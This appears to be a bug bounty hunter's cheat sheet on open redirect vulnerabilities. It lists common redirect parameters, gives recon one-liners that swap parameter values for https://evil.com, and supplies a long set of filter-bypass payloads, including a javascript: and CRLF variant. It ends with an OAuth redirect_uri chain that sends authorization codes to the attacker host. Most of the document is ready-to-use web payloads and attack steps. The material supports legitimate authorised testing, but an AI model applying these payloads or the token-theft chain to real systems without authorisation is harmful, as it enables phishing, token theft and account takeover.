---
tags: [bugbounty, vuln/open-redirect, cheatsheet, p3, p4]
aliases: [Open Redirect, URL Redirect]
cssclasses: [bb-hunter]
updated: 2026-04-21
---

# Open Redirect

> [!tldr] Hunter Summary
> **What:** App redirects to attacker-controlled URL via unvalidated user input.
> **Impact:** Alone = P4/info. Chained with OAuth, phishing, SSRF bypass = P1.
> **Best targets:** `?next=`, `?url=`, `?redirect=`, `?return=`, `?continue=`, `?redir=`
> **Time to triage:** 5 min. Replace value with `https://evil.com`. Get 3xx? Confirmed.

---

## Where to Hunt

| Parameter | Examples |
|-----------|---------|
| `next` | `?next=https://evil.com` |
| `url` | `?url=https://evil.com` |
| `redirect` | `?redirect=https://evil.com` |
| `return` | `?return=https://evil.com` |
| `continue` | `?continue=https://evil.com` |
| `redir` | `?redir=https://evil.com` |
| `goto` | `?goto=https://evil.com` |
| `link` | `?link=https://evil.com` |
| `target` | `?target=https://evil.com` |
| `dest` | `?dest=https://evil.com` |

---

## Step-by-Step Hunt

### Step 1 — Find redirect parameters
```bash
# grep URLs from recon
cat all_urls.txt | grep -E "(next|redirect|url|return|redir|goto|dest|continue)="

# Or with qsreplace
cat all_urls.txt | grep "=" | qsreplace "https://evil.com" | httpx -mc 301,302,307,308 -location
```

### Step 2 — Test basic redirect
```
https://target.com/login?next=https://evil.com
https://target.com/logout?redirect=https://evil.com
https://target.com/auth?return_to=https://evil.com
```

### Step 3 — Filter bypass payloads (if basic fails)
```
# Protocol bypass
//evil.com
//evil.com/%2f..
javascript://evil.com%0aalert(1)

# Domain confusion
https://target.com.evil.com
https://target.com@evil.com
https://evil.com#target.com
https://evil.com?target.com

# Double slash
//evil.com
///evil.com
////evil.com

# URL encoding
%2F%2Fevil.com
%68ttps://evil.com  (h encoded)
https:%2F%2Fevil.com

# Backslash (browser normalizes to /)
/\evil.com
//\evil.com

# With @
https://target.com@evil.com
https://target.com%40evil.com/path

# Newline injection
https://evil.com%0d%0a
```

---

## Chain Ideas

| Open Redirect → | Result |
|----------------|--------|
| OAuth redirect_uri | → Auth code/token theft → ATO |
| Password reset redirect | → Token leak in Referer header |
| SSRF filter bypass | → Use whitelisted domain + open redirect |
| Phishing | → Legitimate-looking URL redirects to phishing |

### Chain with OAuth (most valuable)
```
# If redirect_uri must be on target.com:
redirect_uri=https://target.com/logout?next=https://evil.com

# Flow: auth server → target.com (redirect) → evil.com
# OAuth code arrives at evil.com in ?code= parameter
```

---

## References

- PortSwigger Open Redirect — https://portswigger.net/kb/issues/00500100_open-redirection-reflected
- PayloadsAllTheThings Open Redirect — https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect
